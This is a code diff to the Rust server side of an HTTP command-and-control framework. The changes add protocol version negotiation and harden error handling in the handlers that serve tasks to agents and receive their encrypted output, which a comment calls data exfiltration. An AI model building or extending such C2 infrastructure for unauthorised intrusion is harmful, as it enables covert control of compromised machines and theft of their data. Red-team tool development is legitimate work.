@@ -31,7 +31,7 @@ use axum::extract::State;
 use axum::http::{HeaderMap, Response, StatusCode};
 use axum::response::IntoResponse;
 use axum::Router;
-use common::{Message, PROTOCOL_VERSION};
+use common::{negotiate_protocol_version, Message, MIN_PROTOCOL_VERSION, PROTOCOL_VERSION};
 use dashmap::{mapref::entry::Entry, DashMap};
 use std::collections::{HashMap, VecDeque};
 use std::net::IpAddr;
@@ -146,7 +146,7 @@ async fn handle_get(
     body: &[u8],
 ) -> axum::response::Response {
     // Step 1: Find the matching profile and transaction.
-    let (profile_name, transformer) = match find_matching_get_transformer(&state, path).await {
+    let (profile_name, transformer) = match find_matching_get_transformer(state, path).await {
         Some(result) => result,
         None => {
             return (StatusCode::NOT_FOUND, "Not Found").into_response();
@@ -183,7 +183,7 @@ async fn handle_get(
         match transformer.transform_inbound(body) {
             Ok(decoded) => match crypto.decrypt(&decoded) {
                 Ok(plaintext) => {
-                    process_task_output(&state, &session_id, &plaintext).await;
+                    process_task_output(state, &session_id, &plaintext).await;
                 }
                 Err(e) => {
                     tracing::warn!(
@@ -213,7 +213,7 @@ async fn handle_get(
     );
 
     // Step 4: Check for pending tasks.
-    let task_data = match get_pending_task(&state, &session_id).await {
+    let task_data = match get_pending_task(state, &session_id).await {
         Some(data) => data,
         None => {
             // No tasks pending: return an actual empty body so the agent's
@@ -228,10 +228,19 @@ async fn handle_get(
             )
                 .into_response();
             if let Some(ref hdr) = ecdh_response_header {
-                resp.headers_mut().insert(
-                    axum::http::HeaderName::from_static(common::forward_secrecy::ECDH_HEADER_NAME),
-                    axum::http::HeaderValue::from_str(hdr).unwrap(),
-                );
+                match axum::http::HeaderValue::from_str(hdr) {
+                    Ok(value) => {
+                        resp.headers_mut().insert(
+                            axum::http::HeaderName::from_static(
+                                common::forward_secrecy::ECDH_HEADER_NAME,
+                            ),
+                            value,
+                        );
+                    }
+                    Err(e) => {
+                        tracing::warn!("ECDH response header value invalid (not inserted): {e}");
+                    }
+                }
             }
             return resp;
         }
@@ -263,10 +272,7 @@ async fn handle_get(
         builder = builder.header(common::forward_secrecy::ECDH_HEADER_NAME, hdr.as_str());
     }
 
-    builder
-        .body(axum::body::Body::from(response_body))
-        .unwrap()
-        .into()
+    builder.body(axum::body::Body::from(response_body)).unwrap()
 }
 
 /// Handle a POST request (task output / data exfiltration).
@@ -284,7 +290,7 @@ async fn handle_post(
     body: &[u8],
 ) -> axum::response::Response {
     // Step 1: Find the matching profile and transaction.
-    let (profile_name, transformer) = match find_matching_post_transformer(&state, path).await {
+    let (profile_name, transformer) = match find_matching_post_transformer(state, path).await {
         Some(result) => result,
         None => {
             return (StatusCode::NOT_FOUND, "Not Found").into_response();
@@ -353,7 +359,7 @@ async fn handle_post(
     );
 
     // Process the task output through the app state.
-    process_task_output(&state, &session_id, &plaintext).await;
+    process_task_output(state, &session_id, &plaintext).await;
 
     // Step 5: Send a transformed acknowledgment response.
     let ack = transformer.transform_outbound(b"ACK", &session_id);
@@ -370,10 +376,17 @@ async fn handle_post(
 
     // Add ECDH response header if handshake just completed.
     if let Some(ref hdr) = ecdh_response_header {
-        resp.headers_mut().insert(
-            axum::http::HeaderName::from_static(common::forward_secrecy::ECDH_HEADER_NAME),
-            axum::http::HeaderValue::from_str(hdr).unwrap(),
-        );
+        match axum::http::HeaderValue::from_str(hdr) {
+            Ok(value) => {
+                resp.headers_mut().insert(
+                    axum::http::HeaderName::from_static(common::forward_secrecy::ECDH_HEADER_NAME),
+                    value,
+                );
+            }
+            Err(e) => {
+                tracing::warn!("ECDH response header value invalid (not inserted): {e}");
+            }
+        }
     }
 
     resp
@@ -628,27 +641,56 @@ async fn process_task_output(state: &HttpC2State, session_id: &str, output: &[u8
             }
         }
         Message::VersionHandshake { version } => {
-            if version != PROTOCOL_VERSION {
-                tracing::warn!(
-                    session_id = %session_id,
-                    agent_version = version,
-                    server_version = PROTOCOL_VERSION,
-                    "HTTP C2 agent/server protocol version mismatch"
-                );
+            match negotiate_protocol_version(version) {
+                Some(negotiated) => {
+                    if negotiated != version {
+                        tracing::info!(
+                            session_id = %session_id,
+                            agent_version = version,
+                            negotiated_version = negotiated,
+                            "HTTP C2 protocol version negotiated (agent downgrade)"
+                        );
+                    } else {
+                        tracing::debug!(
+                            session_id = %session_id,
+                            version,
+                            "HTTP C2 version handshake completed"
+                        );
+                    }
+                    enqueue_outbound_message(
+                        state,
+                        session_id,
+                        Message::VersionHandshake {
+                            version: negotiated,
+                        },
+                    );
+                }
+                None => {
+                    tracing::warn!(
+                        session_id = %session_id,
+                        agent_version = version,
+                        min_supported = MIN_PROTOCOL_VERSION,
+                        "HTTP C2 agent protocol version too old; rejecting"
+                    );
+                    // Send our version so the agent knows what we expect, then
+                    // mark the session for teardown by the poll handler.
+                    enqueue_outbound_message(
+                        state,
+                        session_id,
+                        Message::VersionHandshake {
+                            version: PROTOCOL_VERSION,
+                        },
+                    );
+                }
             }
-            enqueue_outbound_message(
-                state,
-                session_id,
-                Message::VersionHandshake {
-                    version: PROTOCOL_VERSION,
-                },
-            );
         }
         Message::TaskResponse {
             task_id, result, ..
         } => {
             if let Some((_, sender)) = state.app_state.pending.remove(&task_id) {
-                let _ = sender.send(result);
+                if let Err(e) = sender.send(result) {
+                    tracing::warn!(%task_id, "failed to deliver TaskResponse to operator (disconnected?): {e:?}");
+                }
             } else {
                 tracing::debug!(%task_id, "received TaskResponse with no pending waiter");
             }
